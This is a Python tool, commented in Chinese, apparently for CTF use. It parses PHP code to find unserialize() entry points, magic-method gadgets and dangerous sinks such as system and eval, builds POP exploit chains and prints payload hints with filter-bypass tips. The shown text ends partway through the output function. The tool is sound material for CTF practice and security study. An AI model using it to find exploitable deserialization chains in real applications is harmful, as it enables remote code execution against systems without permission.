#!/usr/bin/env python3
"""
CTF 解题工具 — PHP 反序列化利用链自动分析器
用途: 面向 CTF 竞赛的自动化解题辅助
场景: 给定 PHP 源码文件，自动识别反序列化入口、提取类结构与魔术方法、
      追踪数据流、构建 POP 利用链、生成可用载荷

核心模型:
  POP 链 = 入口(unserialize) → 跳板(魔术方法) → 传递(对象方法调用) → 终点(危险函数)

用法:
  python3 php_pop_analyzer.py <file1.php> [file2.php ...]
  python3 php_pop_analyzer.py -d <directory>
  python3 php_pop_analyzer.py -u <url>   # 下载源码后分析
"""

import re
import os
import sys
import json
import argparse
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import quote


# ============================================================
# 第一层: PHP 源码解析 — 提取类/方法/属性/调用关系
# ============================================================

# PHP 魔术方法列表及其触发条件
MAGIC_METHODS = {
    '__construct':  '对象创建时: new ClassName()',
    '__destruct':   '对象销毁时: unset/脚本结束',
    '__wakeup':     '反序列化时: unserialize() 自动调用',
    '__sleep':      '序列化时: serialize() 自动调用',
    '__toString':   '对象被当字符串使用: echo $obj / 字符串拼接',
    '__call':       '调用不存在的方法: $obj->nonExist()',
    '__callStatic': '静态调用不存在的方法: ClassName::nonExist()',
    '__get':        '访问不可访问属性: $obj->protectedProp',
    '__set':        '写入不可访问属性: $obj->protectedProp = val',
    '__isset':      '对不可访问属性调用 isset(): isset($obj->prop)',
    '__unset':      '对不可访问属性调用 unset(): unset($obj->prop)',
    '__invoke':     '对象被当函数调用: $obj()',
    '__clone':      '对象被克隆: clone $obj',
}

# 危险函数及其分类
DANGEROUS_FUNCTIONS = {
    # 命令执行
    'system':          '命令执行 — 执行外部程序并输出',
    'exec':            '命令执行 — 执行外部程序',
    'passthru':        '命令执行 — 执行外部程序并原始输出',
    'shell_exec':      '命令执行 — 执行命令返回字符串',
    'popen':           '命令执行 — 打开进程管道',
    'proc_open':       '命令执行 — 打开进程',
    'pcntl_exec':      '命令执行 — 执行程序',
    # 代码执行
    'eval':            '代码执行 — 执行 PHP 代码',
    'assert':          '代码执行 — 断言(可执行代码)',
    'preg_replace':    '代码执行 — /e 修饰符可执行代码(PHP < 7.0)',
    'create_function': '代码执行 — 动态创建函数',
    'call_user_func':  '代码执行 — 回调函数调用',
    'call_user_func_array': '代码执行 — 回调函数调用(数组参数)',
    'array_map':       '代码执行 — 回调函数映射',
    'array_filter':    '代码执行 — 回调函数过滤',
    'usort':           '代码执行 — 回调排序',
    'uasort':          '代码执行 — 回调排序(保持索引)',
    'uksort':          '代码执行 — 回调排序(按键)',
    # 文件操作
    'file_get_contents':  '文件读取 — 读取文件内容',
    'file_put_contents':  '文件写入 — 写入文件',
    'fopen':             '文件操作 — 打开文件',
    'fread':             '文件读取 — 读取文件',
    'fwrite':            '文件写入 — 写入文件',
    'readfile':          '文件读取 — 读取并输出文件',
    'include':           '文件包含 — 包含并执行文件',
    'include_once':      '文件包含 — 包含并执行文件(仅一次)',
    'require':           '文件包含 — 包含并执行文件(致命错误)',
    'require_once':      '文件包含 — 包含并执行文件(仅一次,致命错误)',
    'highlight_file':    '文件读取 — 高亮显示文件源码',
    'show_source':       '文件读取 — 高亮显示文件源码',
    'unlink':            '文件删除 — 删除文件',
    # 反序列化
    'unserialize':       '反序列化入口 — 将序列化字符串还原为对象',
}


@dataclass
class PHPProperty:
    """PHP 类属性"""
    name: str
    visibility: str = 'public'  # public / protected / private
    default_value: Optional[str] = None
    type_hint: Optional[str] = None


@dataclass
class PHPMethod:
    """PHP 类方法"""
    name: str
    visibility: str = 'public'
    is_static: bool = False
    is_magic: bool = False
    params: list = field(default_factory=list)  # 参数列表
    body: str = ''                               # 方法体原始代码
    calls: list = field(default_factory=list)    # 方法内调用的函数
    prop_access: list = field(default_factory=list)  # 访问的属性 $this->xxx
    obj_calls: list = field(default_factory=list)    # 对象方法调用 $obj->xxx()
    prop_method_calls: list = field(default_factory=list)  # $this->prop->method() 多级调用


@dataclass
class PHPClass:
    """PHP 类定义"""
    name: str
    file: str = ''
    methods: dict = field(default_factory=dict)   # name -> PHPMethod
    properties: dict = field(default_factory=dict) # name -> PHPProperty
    parent: Optional[str] = None
    interfaces: list = field(default_factory=list)


@dataclass
class DeserialEntry:
    """反序列化入口"""
    file: str
    line: int
    variable: str          # 被反序列化的变量名
    validation: list = field(default_factory=list)  # is_valid等约束函数
    context: str = ''      # 上下文代码


@dataclass
class POPChain:
    """POP 利用链"""
    entry: DeserialEntry                      # 入口
    chain: list = field(default_factory=list)  # [(class, method, trigger_reason), ...]
    sink: tuple = None                         # (class, method, danger_func)
    constraints: list = field(default_factory=list)  # 约束条件
    payload_hint: str = ''                     # 载荷构造提示


class PHPSourceParser:
    """PHP 源码解析器 — 用正则提取类结构和方法体"""

    def __init__(self):
        self.classes: dict[str, PHPClass] = {}
        self.entries: list[DeserialEntry] = []
        self.raw_code = ''

    def parse_file(self, filepath: str) -> bool:
        """解析单个 PHP 文件"""
        try:
            with open(filepath, 'r', errors='replace') as f:
                code = f.read()
        except Exception as e:
            print(f"[!] 读取文件失败 {filepath}: {e}")
            return False

        self.raw_code = code
        self._extract_classes(code, filepath)
        self._extract_unserialize_entries(code, filepath)
        return True

    def parse_code(self, code: str, filename: str = '<code>') -> bool:
        """解析 PHP 代码字符串"""
        self.raw_code = code
        self._extract_classes(code, filename)
        self._extract_unserialize_entries(code, filename)
        return True

    def _extract_classes(self, code: str, filename: str):
        """提取所有类定义"""
        # 匹配 class ClassName extends Parent implements Interface
        class_pattern = re.compile(
            r'(?:abstract\s+)?class\s+(\w+)'
            r'(?:\s+extends\s+(\w+))?'
            r'(?:\s+implements\s+([\w\s,]+))?'
            r'\s*\{',
            re.MULTILINE
        )

        for m in class_pattern.finditer(code):
            class_name = m.group(1)
            parent = m.group(2)
            interfaces = m.group(3).split(',') if m.group(3) else []

            cls = PHPClass(
                name=class_name,
                file=filename,
                parent=parent,
                interfaces=[i.strip() for i in interfaces if i.strip()]
            )

            # 找到类体的范围（大括号匹配）
            class_start = m.end() - 1  # '{' 的位置
            class_body = self._extract_brace_block(code, class_start)

            if class_body:
                self._extract_properties(class_body, cls)
                self._extract_methods(class_body, cls)

            self.classes[class_name] = cls

    def _extract_brace_block(self, code: str, start: int) -> Optional[str]:
        """从 start 位置（'{' 的索引）提取完整的大括号块"""
        if start >= len(code) or code[start] != '{':
            return None
        depth = 0
        i = start
        while i < len(code):
            if code[i] == '{':
                depth += 1
            elif code[i] == '}':
                depth -= 1
                if depth == 0:
                    return code[start+1:i]
            i += 1
        return None

    def _extract_properties(self, class_body: str, cls: PHPClass):
        """提取类属性"""
        # 匹配 public/protected/private [static] $var [= value];
        # 也匹配 var $var [= value];
        prop_pattern = re.compile(
            r'(?:var\s+|'
            r'(public|protected|private)\s+(?:static\s+)?)'
            r'\$(\w+)'
            r'(?:\s*=\s*([^;]+?))?'
            r'\s*;',
            re.MULTILINE
        )

        for m in prop_pattern.finditer(class_body):
            visibility = m.group(1) if m.group(1) else 'public'
            name = m.group(2)
            default = m.group(3).strip() if m.group(3) else None

            cls.properties[name] = PHPProperty(
                name=name,
                visibility=visibility,
                default_value=default
            )

    def _extract_methods(self, class_body: str, cls: PHPClass):
        """提取类方法"""
        # 匹配 [visibility] [static] function methodName(params) { body }
        method_pattern = re.compile(
            r'(public|protected|private)\s+(?:static\s+)?function\s+(\w+)\s*\(([^)]*)\)\s*\{',
            re.MULTILINE
        )

        # 也要匹配没有可见性修饰符的方法（默认 public）
        method_pattern2 = re.compile(
            r'function\s+(\w+)\s*\(([^)]*)\)\s*\{',
            re.MULTILINE
        )

        found_methods = set()

        for m in method_pattern.finditer(class_body):
            visibility = m.group(1)
            name = m.group(2)
            params = m.group(3)
            brace_start = m.end() - 1

            body = self._extract_brace_block(class_body, brace_start) or ''
            self._add_method(cls, name, visibility, params, body)
            found_methods.add(name)

        for m in method_pattern2.finditer(class_body):
            name = m.group(1)
            if name in found_methods:
                continue
            params = m.group(2)
            brace_start = m.end() - 1

            body = self._extract_brace_block(class_body, brace_start) or ''
            self._add_method(cls, name, 'public', params, body)

    def _add_method(self, cls: PHPClass, name: str, visibility: str, params: str, body: str):
        """添加方法到类，同时提取方法内部调用信息"""
        is_magic = name.startswith('__') and name in MAGIC_METHODS

        method = PHPMethod(
            name=name,
            visibility=visibility,
            is_magic=is_magic,
            params=[p.strip() for p in params.split(',') if p.strip()],
            body=body
        )

        # 提取方法体内的函数调用
        method.calls = self._extract_function_calls(body)

        # 提取 $this->prop 属性访问
        method.prop_access = re.findall(r'\$this->(\w+)', body)

        # 提取 $this->method() 和 $obj->method() 对象方法调用
        method.obj_calls = re.findall(r'\$(\w+)->(\w+)\s*\(', body)

        # 提取 $this->prop->method() 多级调用
        method.prop_method_calls = re.findall(r'\$this->(\w+)->(\w+)\s*\(', body)

        cls.methods[name] = method

    def _extract_function_calls(self, code: str) -> list:
        """提取代码中的函数调用"""
        calls = []
        # 匹配函数调用: funcname( 或 $obj->method(
        for m in re.finditer(r'(\w+)\s*\(', code):
            fname = m.group(1)
            if fname.lower() in ('if', 'else', 'elseif', 'while', 'for', 'foreach',
                                  'switch', 'return', 'echo', 'print', 'new', 'isset',
                                  'unset', 'empty', 'list', 'array', 'class', 'function',
                                  'include', 'require', 'include_once', 'require_once'):
                continue
            calls.append(fname)
        return calls

    def _extract_unserialize_entries(self, code: str, filename: str):
        """提取反序列化入口点"""
        # 匹配 unserialize($var) / unserialize($_GET['key']) / unserialize((string)$var)
        patterns = [
            # unserialize($var)
            (r'unserialize\s*\(\s*\$(\w+)\s*\)', 'simple_var'),
            # unserialize((string)$_GET['key'])
            (r"""unserialize\s*\(\s*\(string\)\s*\$_GET\[['"](?P<key1>\w+)['"]\]\s*\)""", 'string_get'),
            # unserialize($_GET['key'])
            (r"""unserialize\s*\(\s*\$_GET\[['"](?P<key2>\w+)['"]\]\s*\)""", 'get'),
            # unserialize($_POST['key'])
            (r"""unserialize\s*\(\s*\$_POST\[['"](?P<key3>\w+)['"]\]\s*\)""", 'post'),
            # unserialize($_REQUEST['key'])
            (r"""unserialize\s*\(\s*\$_REQUEST\[['"](?P<key4>\w+)['"]\]\s*\)""", 'request'),
            # 通用: unserialize(任意表达式)
            (r'unserialize\s*\(([^)]+)\)', 'generic'),
        ]

        seen_contexts = set()

        for pattern, ptype in patterns:
            for m in re.finditer(pattern, code):
                line_num = code[:m.start()].count('\n') + 1
                ctx = m.group(0)

                # 去重：同一行同一表达式不重复
                dedup_key = f"{line_num}:{ctx}"
                if dedup_key in seen_contexts:
                    continue
                seen_contexts.add(dedup_key)

                if ptype == 'simple_var':
                    var_name = f'${m.group(1)}'
                elif ptype == 'string_get':
                    var_name = f"$_GET['{m.group('key1')}']"
                elif ptype == 'get':
                    var_name = f"$_GET['{m.group('key2')}']"
                elif ptype == 'post':
                    var_name = f"$_POST['{m.group('key3')}']"
                elif ptype == 'request':
                    var_name = f"$_REQUEST['{m.group('key4')}']"
                else:
                    var_name = m.group(1).strip()

                entry = DeserialEntry(
                    file=filename,
                    line=line_num,
                    variable=var_name,
                    context=ctx
                )

                # 检查周围是否有 is_valid 等验证函数
                self._check_validation(code, m.start(), entry)
                self.entries.append(entry)

    def _check_validation(self, code: str, pos: int, entry: DeserialEntry):
        """检查反序列化调用周围的验证约束"""
        # 向上搜索包含此 unserialize 变量的 is_valid / preg_match 等检查
        before = code[max(0, pos-2000):pos]

        # is_valid 类检查
        if re.search(r'is_valid\s*\(', before):
            entry.validation.append('is_valid() 字符范围检查')

        # preg_match 检查
        if re.search(r'preg_match\s*\(', before):
            entry.validation.append('preg_match() 正则检查')

        # stristr/strstr 检查
        if re.search(r'stristr\s*\(|strstr\s*\(', before):
            entry.validation.append('stristr/strstr 字符串过滤')


# ============================================================
# 第二层: 利用链分析 — 图搜索构建 POP 链
# ============================================================

class POPChainAnalyzer:
    """POP 利用链分析器 — 基于图搜索自动构建利用链"""

    def __init__(self, parser: PHPSourceParser):
        self.parser = parser
        self.chains: list[POPChain] = []
        self.max_depth = 8  # 最大搜索深度

    def analyze(self) -> list[POPChain]:
        """执行完整分析流程"""
        print("=" * 70)
        print("  PHP 反序列化利用链自动分析")
        print("=" * 70)

        # 步骤 1: 检查是否有反序列化入口
        if not self.parser.entries:
            print("\n[!] 未发现 unserialize() 入口，尝试从魔术方法反推...")
            # 没有显式入口时，检查是否有可触发的魔术方法
            self._find_implicit_entries()

        # 步骤 2: 打印类结构摘要
        self._print_class_summary()

        # 步骤 3: 识别危险终点（sink）
        sinks = self._find_sinks()
        if not sinks:
            print("\n[!] 未发现可利用的危险函数终点")
            return self.chains

        # 步骤 4: 识别魔术方法跳板
        gadgets = self._find_gadgets()

        # 步骤 5: 构建 POP 链
        self._build_chains(gadgets, sinks)

        # 步骤 6: 输出结果
        self._print_results()

        return self.chains

    def _find_implicit_entries(self):
        """从魔术方法推断隐式入口"""
        for name, cls in self.parser.classes.items():
            for method in cls.methods.values():
                if method.is_magic and method.name in ('__destruct', '__wakeup', '__toString'):
                    entry = DeserialEntry(
                        file=cls.file,
                        line=0,
                        variable='(隐式入口: 需反序列化触发)',
                        context=f'{cls.name}::{method.name}()'
                    )
                    self.parser.entries.append(entry)

    def _print_class_summary(self):
        """打印类结构摘要"""
        print(f"\n[*] 发现 {len(self.parser.classes)} 个类, "
              f"{len(self.parser.entries)} 个反序列化入口\n")

        for cls_name, cls in self.parser.classes.items():
            magic = [m for m in cls.methods.values() if m.is_magic]
            props = list(cls.properties.values())
            print(f"  [{cls_name}]" + (f" extends {cls.parent}" if cls.parent else ""))
            print(f"    属性 ({len(props)}):")
            for prop in props:
                default = f" = {prop.default_value}" if prop.default_value else ""
                print(f"      {prop.visibility} ${prop.name}{default}")
            print(f"    方法 ({len(cls.methods)}):")
            for m in cls.methods.values():
                tag = " [魔术方法]" if m.is_magic else ""
                calls = f" → calls: {', '.join(m.calls[:5])}" if m.calls else ""
                print(f"      {m.visibility} {m.name}(){tag}{calls}")
            print()

    def _find_sinks(self) -> list[tuple]:
        """识别危险函数终点 → [(class, method, danger_func, category), ...]"""
        sinks = []
        seen = set()

        for cls_name, cls in self.parser.classes.items():
            for method_name, method in cls.methods.items():
                for call in method.calls:
                    if call in DANGEROUS_FUNCTIONS and call != 'unserialize':
                        key = (cls_name, method_name, call)
                        if key not in seen:
                            seen.add(key)
                            sinks.append((cls_name, method_name, call, DANGEROUS_FUNCTIONS[call]))

        if sinks:
            print("[*] 危险终点 (Sink):")
            for cls, method, func, desc in sinks:
                print(f"    {cls}::{method}() → {func}() [{desc}]")
            print()

        return sinks

    def _find_gadgets(self) -> list[tuple]:
        """识别魔术方法跳板 → [(class, magic_method, trigger_reason), ...]"""
        gadgets = []

        for cls_name, cls in self.parser.classes.items():
            for method_name, method in cls.methods.items():
                if method.is_magic:
                    trigger = MAGIC_METHODS.get(method_name, '未知触发条件')
                    gadgets.append((cls_name, method_name, trigger))

        if gadgets:
            print("[*] 魔术方法跳板 (Gadget):")
            for cls, method, trigger in gadgets:
                print(f"    {cls}::{method}() — {trigger}")
            print()

        return gadgets

    def _build_chains(self, gadgets: list, sinks: list):
        """构建 POP 利用链 — 从入口出发 DFS 搜索，收集所有可达 sink"""
        print("[*] 构建 POP 利用链...\n")

        for entry in self.parser.entries:
            # 对每个入口，尝试找到可达的所有 sink
            for cls_name, cls in self.parser.classes.items():
                # 从魔术方法开始搜索
                for method_name in ('__destruct', '__wakeup', '__toString', '__call',
                                    '__get', '__set', '__invoke'):
                    if method_name in cls.methods:
                        # 搜索所有可达路径（DFS 不提前返回，收集所有结果）
                        all_results = self._search_all_chains(cls_name, method_name, [], 0)
                        for chain_info in all_results:
                            pop = POPChain(
                                entry=entry,
                                chain=chain_info['path'],
                                sink=chain_info['sink'],
                                constraints=entry.validation,
                                payload_hint=self._generate_payload_hint(chain_info, entry)
                            )
                            # 去重
                            chain_key = str(pop.chain) + str(pop.sink)
                            if not any(str(c.chain) + str(c.sink) == chain_key for c in self.chains):
                                self.chains.append(pop)

    def _search_all_chains(self, cls_name: str, method_name: str,
                           visited: list, depth: int) -> list:
        """DFS 搜索从 (cls, method) 出发的所有可达 sink 路径"""
        results = []

        if depth > self.max_depth:
            return results

        key = f"{cls_name}::{method_name}"
        if key in visited:
            return results
        visited = visited + [key]

        cls = self.parser.classes.get(cls_name)
        if not cls:
            return results

        method = cls.methods.get(method_name)
        if not method:
            return results

        # 检查当前方法是否直接调用危险函数 — 收集所有 sink
        for call in method.calls:
            if call in DANGEROUS_FUNCTIONS and call != 'unserialize':
                sink_info = (cls_name, method_name, call, DANGEROUS_FUNCTIONS[call])
                results.append({
                    'path': [(cls_name, method_name, self._get_trigger(method_name))],
                    'sink': sink_info,
                })

        # 检查 $this->method() 调用 — 同类控制流传递
        for obj_var, called_method in method.obj_calls:
            if obj_var == 'this' and called_method in cls.methods:
                sub_results = self._search_all_chains(cls_name, called_method, visited, depth+1)
                for r in sub_results:
                    r['path'] = [(cls_name, method_name, self._get_trigger(method_name))] + r['path']
                results.extend(sub_results)

        # 检查 $this->prop->method() — 属性对象的方法调用（跨类核心）
        for prop_name, called_method in method.prop_method_calls:
            for other_cls_name, other_cls in self.parser.classes.items():
                if other_cls_name == cls_name:
                    continue
                if called_method in other_cls.methods:
                    sub_results = self._search_all_chains(other_cls_name, called_method, visited, depth+1)
                    for r in sub_results:
                        trigger = self._get_trigger(method_name)
                        prefix = [(cls_name, method_name, trigger),
                                   (f'$this->{prop_name}={other_cls_name}', called_method,
                                    f'属性对象方法调用 $this->{prop_name}->{called_method}()')]
                        r['path'] = prefix + r['path']
                    results.extend(sub_results)

        # 检查 call_user_func($this->xxx, ...) — 回调跳板
        for call in method.calls:
            if call in ('call_user_func', 'call_user_func_array'):
                cb_match = re.search(r'call_user_func\s*\(\s*\$this->(\w+)', method.body)
                if cb_match:
                    prop_name = cb_match.group(1)
                    for other_cls_name, other_cls in self.parser.classes.items():
                        if '__invoke' in other_cls.methods:
                            sub_results = self._search_all_chains(other_cls_name, '__invoke', visited, depth+1)
                            for r in sub_results:
                                trigger = self._get_trigger(method_name)
                                prefix = [(cls_name, method_name, trigger),
                                           (f'${prop_name}={other_cls_name}', '__invoke', '对象被当函数调用')]
                                r['path'] = prefix + r['path']
                            results.extend(sub_results)

        # ── 隐式触发追踪 ─────────────────────────────────────────
        # 以下 5 个分支覆盖魔术方法的隐式触发模式：
        #   1. echo/print/字符串拼接中的属性 → __toString
        #   2. $this->obj->不存在方法()     → __call
        #   3. clone $var                    → __clone
        #   4. isset($this->obj->prop)      → __isset
        #   5. ($this->prop)()              → __invoke

        # ── 分支 1: echo/print/字符串拼接中的属性被当字符串 → __toString ──
        # 模式: echo "xxx" . $this->name  /  echo $this->name  /  print $this->name
        # 当属性作为字符串输出时，若属性是对象则触发其 __toString
        string_context_props = self._find_string_context_props(method.body)
        for prop_name in string_context_props:
            if prop_name in method.prop_access:  # 确实是当前类的属性
                for other_cls_name, other_cls in self.parser.classes.items():
                    if other_cls_name == cls_name:
                        continue
                    if '__toString' in other_cls.methods:
                        sub_results = self._search_all_chains(other_cls_name, '__toString', visited, depth+1)
                        for r in sub_results:
                            trigger = self._get_trigger(method_name)
                            prefix = [(cls_name, method_name, trigger),
                                       (f'$this->{prop_name}={other_cls_name}', '__toString',
                                        f'echo/字符串拼接触发 → __toString')]
                            r['path'] = prefix + r['path']
                        results.extend(sub_results)

        # ── 分支 2: $this->obj->不存在方法() → __call ──
        # 模式: $this->obj->someMethod() 其中 someMethod 在目标类中不存在
        # 特殊处理: __call($fun, $var) 中若出现 clone $var[0]，
        #   则 $var[0] 的实际类型 = 调用者传入的参数类型
        for prop_name, called_method in method.prop_method_calls:
            for other_cls_name, other_cls in self.parser.classes.items():
                if other_cls_name == cls_name:
                    continue
                # 如果被调方法在目标类中不存在，且目标类有 __call，则 __call 被触发
                if called_method not in other_cls.methods and '__call' in other_cls.methods:
                    sub_results = self._search_all_chains(other_cls_name, '__call', visited, depth+1)
                    for r in sub_results:
                        trigger = self._get_trigger(method_name)
                        prefix = [(cls_name, method_name, trigger),
                                   (f'$this->{prop_name}={other_cls_name}', '__call',
                                    f'调用不存在方法 {called_method}() → __call')]
                        r['path'] = prefix + r['path']
                    results.extend(sub_results)

                    # 进阶: 追踪 __call 内的 clone $var[0]
                    # $var[0] 的类型来自调用者传入的参数
                    # 模式: $this->obj->method($this->arg) → __call 中 clone $var[0] 的 $var[0] = $this->arg
                    call_arg_props = self._find_call_arg_props(method.body, prop_name, called_method)
                    call_method = other_cls.methods.get('__call')
                    if call_method and '__clone_from_var_' in ','.join(self._find_clone_targets(call_method.body)):
                        # __call 内部做了 clone，被 clone 的对象类型来自调用参数
                        for arg_prop_name in call_arg_props:
                            for inner_cls_name, inner_cls in self.parser.classes.items():
                                if inner_cls_name == cls_name or inner_cls_name == other_cls_name:
                                    continue
                                if '__clone' in inner_cls.methods:
                                    sub_results = self._search_all_chains(inner_cls_name, '__clone', visited, depth+1)
                                    for r in sub_results:
                                        trigger = self._get_trigger(method_name)
                                        prefix = [
                                            (cls_name, method_name, trigger),
                                            (f'$this->{prop_name}={other_cls_name}', '__call',
                                             f'调用不存在方法 {called_method}() → __call'),
                                            (f'$this->{arg_prop_name}={inner_cls_name}', '__clone',
                                             f'clone $var[0] → __clone'),
                                        ]
                                        r['path'] = prefix + r['path']
                                    results.extend(sub_results)

        # ── 分支 3: clone $var → __clone ──
        # 模式: clone $var[0] / clone $this->obj / clone $obj
        clone_targets = self._find_clone_targets(method.body)
        for target_prop in clone_targets:
            for other_cls_name, other_cls in self.parser.classes.items():
                if other_cls_name == cls_name:
                    continue
                if '__clone' in other_cls.methods:
                    sub_results = self._search_all_chains(other_cls_name, '__clone', visited, depth+1)
                    for r in sub_results:
                        trigger = self._get_trigger(method_name)
                        prefix = [(cls_name, method_name, trigger),
                                   (f'clone_target={other_cls_name}', '__clone',
                                    f'clone 对象 → __clone')]
                        r['path'] = prefix + r['path']
                    results.extend(sub_results)

        # ── 分支 4: isset($this->obj->prop) → __isset ──
        # 模式: isset($this->obj->cmd) 其中 cmd 在目标类中不存在/不可访问
        isset_triggers = self._find_isset_triggers(method.body)
        for obj_prop, checked_prop in isset_triggers:
            for other_cls_name, other_cls in self.parser.classes.items():
                if other_cls_name == cls_name:
                    continue
                if '__isset' in other_cls.methods:
                    # 检查被 isset 的属性在目标类中是否不可访问
                    # 不存在 或 protected/private（从外部访问不可达）
                    if checked_prop not in other_cls.properties:
                        prop_inaccessible = True
                    else:
                        prop_vis = other_cls.properties[checked_prop].visibility
                        prop_inaccessible = (prop_vis in ('protected', 'private'))
                    if prop_inaccessible:
                        sub_results = self._search_all_chains(other_cls_name, '__isset', visited, depth+1)
                        for r in sub_results:
                            trigger = self._get_trigger(method_name)
                            prefix = [(cls_name, method_name, trigger),
                                       (f'${obj_prop}={other_cls_name}', '__isset',
                                        f'isset 不可访问属性 ${checked_prop} → __isset')]
                            r['path'] = prefix + r['path']
                        results.extend(sub_results)

        # ── 分支 5: ($this->prop)() → __invoke ──
        # 模式: ($this->func)() / ($this->callback)($arg)
        invoke_props = self._find_invoke_targets(method.body)
        for prop_name in invoke_props:
            for other_cls_name, other_cls in self.parser.classes.items():
                if other_cls_name == cls_name:
                    continue
                if '__invoke' in other_cls.methods:
                    sub_results = self._search_all_chains(other_cls_name, '__invoke', visited, depth+1)
                    for r in sub_results:
                        trigger = self._get_trigger(method_name)
                        prefix = [(cls_name, method_name, trigger),
                                   (f'$this->{prop_name}={other_cls_name}', '__invoke',
                                    f'($this->{prop_name})() → __invoke')]
                        r['path'] = prefix + r['path']
                    results.extend(sub_results)

        return results

    def _find_string_context_props(self, method_body: str) -> list:
        """找出在字符串上下文中使用的属性名列表
        模式: echo $this->name / echo "xxx" . $this->name / print $this->name
              "xxx" . $this->name / $this->name . "xxx"
        """
        props = []
        seen = set()

        # echo $this->prop
        for m in re.finditer(r'echo\s+\$this->(\w+)', method_body):
            prop = m.group(1)
            if prop not in seen:
                seen.add(prop)
                props.append(prop)

        # print $this->prop
        for m in re.finditer(r'print\s+\$this->(\w+)', method_body):
            prop = m.group(1)
            if prop not in seen:
                seen.add(prop)
                props.append(prop)

        # 字符串拼接: "xxx" . $this->prop 或 $this->prop . "xxx"
        for m in re.finditer(r'\.\s*\$this->(\w+)', method_body):
            prop = m.group(1)
            if prop not in seen:
                seen.add(prop)
                props.append(prop)

        for m in re.finditer(r'\$this->(\w+)\s*\.', method_body):
            prop = m.group(1)
            if prop not in seen:
                seen.add(prop)
                props.append(prop)

        return props

    def _find_clone_targets(self, method_body: str) -> list:
        """找出 clone 操作的目标属性名列表
        模式: clone $var[0] / clone $this->obj / clone $obj
        返回: 属性名列表（如果是 $this->xxx），或者变量名（如果是其他变量）
        """
        targets = []
        seen = set()

        # clone $this->prop
        for m in re.finditer(r'clone\s+\$this->(\w+)', method_body):
            prop = m.group(1)
            if prop not in seen:
                seen.add(prop)
                targets.append(prop)

        # clone $var[0] — $var 是方法参数或局部变量，需要追踪来源
        # 对于 clone $var[0] 模式，var 可能来自 __call 的 $var 参数
        for m in re.finditer(r'clone\s+\$(\w+)\[', method_body):
            var_name = m.group(1)
            # 追踪该变量: 如果来自 __call($fun, $var) 参数，则 $var[0] 是调用时传入的参数
            # 标记为特殊标识，后续由调用者上下文决定类型
            tag = f'__clone_from_var_{var_name}'
            if tag not in seen:
                seen.add(tag)
                targets.append(tag)

        # clone $var — 简单变量
        for m in re.finditer(r'clone\s+\$(\w+)(?!\[)', method_body):
            var_name = m.group(1)
            if var_name == 'this':
                continue
            tag = f'__clone_from_var_{var_name}'
            if tag not in seen:
                seen.add(tag)
                targets.append(tag)

        return targets

    def _find_isset_triggers(self, method_body: str) -> list:
        """找出 isset 调用中访问不可访问属性的模式
        模式: isset($this->obj->cmd) → (obj_prop, checked_prop)
        返回: [(属性名, 被检查的属性名), ...]
        """
        triggers = []
        seen = set()

        # isset($this->obj->prop) — $this 的属性的对象属性
        for m in re.finditer(r'isset\s*\(\s*\$this->(\w+)->(\w+)', method_body):
            obj_prop = m.group(1)
            checked_prop = m.group(2)
            key = (obj_prop, checked_prop)
            if key not in seen:
                seen.add(key)
                triggers.append(key)

        # isset($obj->prop) — 通用变量
        for m in re.finditer(r'isset\s*\(\s*\$(\w+)->(\w+)', method_body):
            obj_var = m.group(1)
            checked_prop = m.group(2)
            if obj_var == 'this':
                continue
            key = (obj_var, checked_prop)
            if key not in seen:
                seen.add(key)
                triggers.append(key)

        return triggers

    def _find_invoke_targets(self, method_body: str) -> list:
        """找出变量函数调用（对象被当函数调用）的属性名
        模式: ($this->func)() / ($this->callback)($arg)
        """
        props = []
        seen = set()

        # ($this->prop)()
        for m in re.finditer(r'\(\s*\$this->(\w+)\s*\)\s*\(', method_body):
            prop = m.group(1)
            if prop not in seen:
                seen.add(prop)
                props.append(prop)

        # $this->prop() 但 prop 不是已知方法 — 这可能是变量函数调用
        # (已在 obj_calls 中处理，此处不重复)

        return props

    def _find_call_arg_props(self, method_body: str, obj_prop: str, called_method: str) -> list:
        """找出 $this->obj->method($this->arg1, ...) 调用中传入的 $this->xxx 属性名
        用于追踪 __call 中 clone $var[0] 的 $var[0] 来源
        Args:
            method_body: 调用者方法体
            obj_prop: 对象属性名 (如 'obj')
            called_method: 被调用的方法名 (如 'check')
        Returns:
            传入参数中的 $this->xxx 属性名列表
        """
        args = []
        # 匹配 $this->obj->method($this->arg, ...)
        pattern = re.compile(
            rf'\$this->{re.escape(obj_prop)}->{re.escape(called_method)}\s*\(([^)]*)\)'
        )
        m = pattern.search(method_body)
        if m:
            arg_str = m.group(1)
            # 提取 $this->xxx 参数
            for arg_match in re.finditer(r'\$this->(\w+)', arg_str):
                args.append(arg_match.group(1))
        return args

    def _get_trigger(self, method_name: str) -> str:
        """获取方法的触发条件描述"""
        if method_name in MAGIC_METHODS:
            return MAGIC_METHODS[method_name]
        return f'方法调用 $this->{method_name}()'

    def _generate_payload_hint(self, chain_info: dict, entry: DeserialEntry) -> str:
        """根据利用链生成载荷构造提示"""
        path = chain_info['path']
        sink = chain_info['sink']
        constraints = entry.validation

        lines = []
        lines.append("载荷构造要点:")

        # 找到入口类
        if path:
            entry_cls = path[0][0]
            lines.append(f"  1. 反序列化目标类: {entry_cls}")

        # 属性赋值 — 去重
        lines.append("  2. 需要控制的属性:")
        seen = set()
        for cls_name, method_name, trigger in path:
            cls = self.parser.classes.get(cls_name, None)
            if cls:
                for prop in cls.properties.values():
                    dedup_key = f"{cls_name}::{prop.name}"
                    if dedup_key not in seen:
                        seen.add(dedup_key)
                        lines.append(f"     - {cls_name}::${prop.name} ({prop.visibility})")

        # 约束绕过
        if constraints:
            lines.append("  3. 需要绕过的约束:")
            for c in constraints:
                lines.append(f"     - {c}")
                if 'is_valid' in c:
                    lines.append("     → 绕过: 用 public 属性名替代 protected/private（PHP 7.1+）")
                if 'preg_match' in c or 'stristr' in c or 'strstr' in c:
                    lines.append("     → 绕过: 检查过滤函数的具体匹配规则，寻找不匹配的替代写法")

        # 弱类型绕过提示
        for cls_name, method_name, trigger in path:
            cls = self.parser.classes.get(cls_name, None)
            if cls and method_name in cls.methods:
                method = cls.methods[method_name]
                if '===' in method.body:
                    lines.append("  4. 注意严格比较 (===): 考虑用整数代替字符串绕过")

        return '\n'.join(lines)

    def _print_results(self):
        """打印分析结果"""
        if not self.chains:
            print("[!] 未能自动构建完整的 POP 链")
            print("    可能原因:")
            print("    - 利用链需要跨多个嵌套对象，超出搜索深度")
            print("    - 利用链涉及动态方法调用(变量函数)，无法静态追踪")
            print("    - 需要手动分析魔术方法间的调用关系")
            self._print_manual_hints()
            return

        print("=" * 70)
